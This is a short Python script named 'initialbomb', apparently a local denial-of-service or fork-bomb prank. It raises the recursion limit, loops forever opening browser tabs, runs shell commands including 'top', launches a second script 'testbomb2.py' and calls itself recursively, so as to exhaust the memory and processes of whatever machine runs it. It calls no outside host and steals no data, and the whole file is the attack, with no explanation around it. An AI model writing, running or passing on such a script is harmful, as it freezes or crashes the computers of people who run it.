import sys
import random
import os
import webbrowser
sys.setrecursionlimit(150000000)
sys.setswitchinterval(0)
sys.set_int_max_str_digits(10000000)
def initialbomb():
    x = 1
    x+= 1**7
    y = 1**x
    y+=1**2**x

    while True:
        x+=sys.maxunicode**sys.maxsize
        webbrowser.open_new_tab("https://www.google.com")
        random.randint(0,1000)
        os.system("echo 11182173272323")
        os.system("top")
        os.system('python3 testbomb2.py')
        initialbomb()
initialbomb()
